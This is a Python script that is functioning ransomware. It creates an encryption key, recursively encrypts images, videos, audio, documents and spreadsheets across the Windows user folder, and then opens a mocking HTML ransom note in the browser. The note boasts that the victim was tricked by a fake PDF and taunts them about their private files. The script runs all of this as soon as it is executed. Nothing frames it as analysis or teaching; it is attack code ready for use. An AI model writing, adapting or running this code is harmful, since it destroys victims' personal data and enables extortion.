import glob
import getpass
from cryptography.fernet import Fernet
import os
import webbrowser
#create functions to encrypt specific filetypes
def enc_file(filename):
    key_file = open('key.key', 'rb')
    key = key_file.read()
    fernet = Fernet(key)
    user = getpass.getuser()

    path = 'c:\\Users\\' + user + '\\'

    txt = [f for f in glob.glob(path + "**/*." + filename, recursive=True)]

    for f in txt:
        with open(f, 'rb') as g:
            data = g.read()
        encrypted = fernet.encrypt(data)
        with open(f, 'wb') as g:
            g.write(encrypted)

def run_cryptor():
    files = ["jpg", "jpeg", "png", "gif", "mp4", "wav", "mp3", "doc", "docx", "docb", "csv", "pdf", "rtf", "mp4", "xls", "xlsx", "ppt", "pptx", "txt"]
    for i in files:
        
        enc_file(i)

def generatekey():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as kf:
        kf.write(key)

def write_html():
    html_code = """
                <!DOCTYPE html>
                <html lang="en" dir="ltr">
                <head>
                <style media="screen">
                body{
                background-color: black;
                }
                #header{
                color: red;
                text-align: center;
                }
                .header2{
                text-align: center;
                color: red;
                }
                .paras{
                text-align: center;
                color: red;
                }
                </style>
                <meta charset="utf-8">
                <title>ALERT!!!</title>
                </head>
                <body>
                <h1 id="header">Alert user all your files have been encrypted!!!</h1>
                <h2 class="header2">Can I get my files back?</h2>
                <p class="paras">
                Absolutely a link will be provided to the decryption tool
                It takes a special kind of stupid to click on something you shouldn't
                You really fell for a fake PDF lol get rekt scrub
                <br>
                </p>
                <h2 class="header2">What has been encrypted?</h2>
                <p class="paras">
                All media files such as pictures and movies and all those nudes didn't think we would find that folder did you? XD
                All documents such as pdfs and word docs as well as the notepad file where you keep you credit card info and all your passwords
                Please note that only files in your user folder have been encrypted we don't see any reason why others should suffer for your stupidity
                </p>
                </body>
                </html>"""
    with open('index.html', 'w') as f:
        f.write(html_code)




def alert_usr():
        
    url = 'file:///' + os.getcwd() + '/index.html'  
    webbrowser.open(url, new=0, autoraise=True)



def check_key():
    try:
        with open('key.key', 'rb') as key:
            run_cryptor()
    except FileNotFoundError:
        generatekey()
        run_cryptor()
        
check_key()
write_html()
alert_usr()

